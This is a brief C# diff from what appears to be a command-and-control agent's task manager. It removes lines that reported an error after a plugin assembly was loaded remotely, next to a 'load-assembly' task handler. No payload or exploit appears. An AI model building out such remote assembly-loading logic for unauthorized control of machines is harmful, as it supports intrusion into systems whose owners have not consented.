@@ -41,9 +41,6 @@ namespace Agent.Managers
                             this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf);
                         }
                     }
-                    rr.process_response = new Dictionary<string, string> { { "message", "" } };
-                    rr.status = "error";
-                    await this.messageManager.AddResponse(rr);
                     break;
                 case "load-assembly":
                     LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
